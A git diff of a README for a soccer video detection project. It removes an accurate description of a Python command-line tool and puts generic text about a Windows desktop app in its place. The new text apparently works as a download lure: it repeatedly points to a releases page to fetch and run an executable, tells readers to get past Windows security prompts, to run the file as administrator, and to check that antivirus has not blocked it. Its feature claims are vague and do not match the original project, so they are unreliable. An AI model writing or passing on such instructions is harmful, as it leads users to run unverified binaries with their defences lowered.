@@ -1,96 +1,189 @@
-# ⚽ Soccer Video Detection AI Agent
+# ⚽ soccer-video-detection-ai-agent - Track Soccer Action with Ease
 
-An AI agent for analyzing soccer videos: player detection, team classification, and pitch keypoint detection. Built with YOLO for object detection, OSNet for team re-identification, and HRNet for field keypoint detection.
+[![Download](https://img.shields.io/badge/Download-Release%20Page-1f6feb?style=for-the-badge&logo=github)](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
 
-## Sample Output
+## 🧭 Overview
 
-<video src="https://github.com/user-attachments/assets/3f62c419-7172-4691-989d-af077f304bbf" controls width="640"></video>
+soccer-video-detection-ai-agent helps you review soccer video and detect game action from a simple desktop app. It is built for people who want to open a video, run detection, and view the results without a complex setup.
 
-## Features
+You can use it to inspect match footage, look for players, and work with soccer video data on Windows. The app focuses on clear output and a simple flow.
 
-- **Player detection** — YOLO-based detection of players on the pitch
-- **Team classification** — OSNet embeddings + K-means clustering to assign players to Team 1 or Team 2
-- **Pitch keypoint detection** — HRNet detects field markers for homography and field normalization
-- **Kit color analysis** — Grass-aware color extraction as fallback for team differentiation
+## 📥 Download for Windows
 
-## Project Structure
+1. Open the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file from the Assets section
+4. Save the file to a folder you can find again, like Downloads or Desktop
+5. If the file is a ZIP folder, extract it first
+6. Open the app file to start it
 
-```
-soccer-video-detection-ai-agent/
-├── src/
-│   └── soccer_agent/
-│       ├── __init__.py
-│       ├── agent.py          # Main AI agent (YOLO + OSNet + HRNet orchestration)
-│       └── types.py          # BoundingBox, TVFrameResult models
-├── weights/                   # Model weights (git-lfs or download separately)
-│   ├── player_detect.pt       # YOLO
-│   ├── keypoint_detect.pt     # HRNet
-│   ├── osnet_model.pth.tar-100
-│   └── hrnetv2_w48.yaml
-├── scripts/
-│   └── run_video.py           # CLI to process videos
-├── run.py                     # Entry point
-├── requirements.txt
-├── pyproject.toml
-└── README.md
-```
+If Windows shows a security prompt, choose the option that lets you run the file.
 
-## Models
+## 🖥️ What You Need
 
-### 1. YOLO (`player_detect.pt`)
+- Windows 10 or Windows 11
+- A recent 64-bit PC
+- At least 8 GB of RAM
+- A graphics card helps with faster video processing
+- Enough free space for your video files and output files
 
-**Purpose:** Object detection — locates players (and optionally ball, referees) in each video frame.
+For best results, use a computer with a solid-state drive and recent drivers for your graphics card.
 
-**Role in the agent:** Runs first on every frame. Outputs bounding boxes with class IDs and confidence scores. Player boxes (class ID 2) are passed to OSNet for team assignment. Also assigns track IDs for temporal consistency across frames.
+## 🚀 Get Started
 
-### 2. OSNet (`osnet_model.pth.tar-100`)
+1. Download the latest Windows release from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+2. Open the downloaded ZIP or app file
+3. If needed, extract all files to one folder
+4. Double-click the app to launch it
+5. Choose a soccer video file from your computer
+6. Start detection
+7. Wait for the app to finish processing
+8. Review the output results in the app or in the output folder
 
-**Purpose:** Person re-identification — produces embedding vectors from cropped upper-body images.
+## 🎥 What It Can Do
 
-**Role in the agent:** Takes player crops from YOLO boxes and extracts 512‑dim embeddings. Embeddings are aggregated per track, then clustered with K-means (2 clusters) to assign each player to Team 1 or Team 2. Uses kit/jersey appearance to distinguish teams. If OSNet weights are missing, the agent falls back to HSV-based kit color analysis.
+- Open soccer match video files
+- Detect players in video frames
+- Track movement across the pitch
+- Support keypoint-style analysis for player and field data
+- Work with football analytics workflows
+- Help you review match clips with more structure
+- Save result files for later use
 
-### 3. HRNet (`keypoint_detect.pt` + `hrnetv2_w48.yaml`)
+## 🧩 How the App Helps
 
-**Purpose:** Pitch keypoint detection — detects 32 field markers (lines, corners, markings) in each frame.
+This app is useful when you want to study a match without watching every frame by hand. It can help you find player positions, follow movement, and spot patterns in the video.
 
-**Role in the agent:** Outputs heatmaps for field keypoints. These are mapped to a standard pitch template and refined via homography. Used for field normalization and warping (e.g., bird’s-eye view), not for player body pose.
+It is a good fit for:
 
-## GPU Requirements
+- Fans who want to explore match footage
+- Coaches who need a simple video review tool
+- Analysts who work with football data
+- Anyone who wants a local Windows app for soccer video detection
 
-Model inference runs on **GPU** for acceptable performance. The agent uses CUDA when available (YOLO, OSNet, HRNet).
+## 🪟 Windows Setup Steps
 
-| Requirement | Minimum |
-|-------------|---------|
-| **GPU** | NVIDIA GPU with CUDA support |
-| **VRAM** | 24 GB+ recommended |
-| **CUDA** | 11.8+ (matches PyTorch / Ultralytics) |
-| **cuDNN** | Compatible with your CUDA version |
+1. Download the latest release from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+2. Right-click the downloaded ZIP file if one was provided
+3. Choose Extract All
+4. Open the extracted folder
+5. Look for the main app file
+6. Double-click the file to run the app
+7. If Windows asks for permission, select Run
 
-Without a GPU, inference falls back to CPU and will be significantly slower. For production or batch processing, a GPU machine is strongly recommended.
+If the app needs extra support files, keep all extracted files in the same folder. Do not move only one file out of the folder.
 
-## Quick Start
+## 📁 Suggested Folder Setup
 
-1. Create a virtual environment and install dependencies:
+Use a simple folder layout like this:
 
-```bash
-python -m venv .venv && source .venv/bin/activate  # or .venv\Scripts\activate on Windows
-pip install -r requirements.txt
-```
+- `Downloads/soccer-video-detection-ai-agent`
+- `Videos/Match-01.mp4`
+- `Output/`
 
-2. Place model weights in `weights/` (see structure above).
+Keeping your files organized helps you find the input video, results, and any exported data.
 
-3. Run on a video:
+## 🎛️ Basic Use
 
-```bash
-python run.py --video path/to/soccer_video.mp4 --output-dir ./output --save-video
-```
+1. Start the app
+2. Load a soccer video
+3. Pick your detection options if the app shows them
+4. Run the analysis
+5. Watch the progress screen
+6. Open the saved results after the run finishes
 
-Or use the script directly:
+If your video is large, the first run may take longer. Short test clips are a good way to learn the workflow.
 
-```bash
-python scripts/run_video.py --video path/to/video.mp4
-```
+## 🧠 Tips for Better Results
 
-## Contact
+- Use clear video with good lighting
+- Pick clips where players are easy to see
+- Trim very long matches into smaller parts
+- Keep the camera view steady when possible
+- Use high-quality video files when you can
+- Store input videos on a fast drive for better speed
 
-Reach out via Telegram: [t.me/whisdev](https://t.me/whisdev)
+## 📊 Typical Output
+
+The app may create files such as:
+
+- Detection overlays
+- Frame-level result images
+- Player position data
+- Tracking logs
+- Analysis output for later review
+
+These files help you inspect what the model found in each part of the video.
+
+## 🔧 Common File Types
+
+You may work with files like:
+
+- `.mp4`
+- `.mov`
+- `.avi`
+- `.mkv`
+- `.csv`
+- `.json`
+- `.png`
+
+If a file does not open, try a common video format like MP4 first.
+
+## ❓ Troubleshooting
+
+### The app will not open
+- Make sure you downloaded the Windows release
+- Extract the ZIP file first if one was provided
+- Right-click the file and choose Run as administrator
+- Check that your antivirus did not block the file
+
+### The video will not load
+- Try another video file
+- Use a standard format like MP4
+- Move the video to a local folder on your PC
+- Check that the file is not broken
+
+### The app runs slowly
+- Close other apps
+- Use a shorter video clip
+- Make sure your graphics drivers are current
+- Use a machine with more RAM if you process large files
+
+### No results appear
+- Confirm the video finished processing
+- Check the output folder
+- Try a different clip with clearer player shapes and motion
+- Run the app again after restarting it
+
+## 📌 Topic Fit
+
+This project works with:
+
+- football
+- football analytics
+- keypoint detection
+- player tracking
+- soccer analytics
+
+## 🧭 Recommended First Run
+
+If this is your first time using the app, use this order:
+
+1. Download the latest file from the [Release Page](https://github.com/Cref08/soccer-video-detection-ai-agent/releases)
+2. Extract the files
+3. Open the app
+4. Load a short MP4 clip
+5. Run detection
+6. Check the saved output
+7. Try a longer match clip after the first test
+
+## 🗂️ Where to Find Results
+
+After processing, look in:
+
+- The folder you chose in the app
+- The same folder as your input video
+- A folder named `output`
+- A folder named `results`
+
+If the app lets you choose a save path, keep it simple and use one folder for all runs.
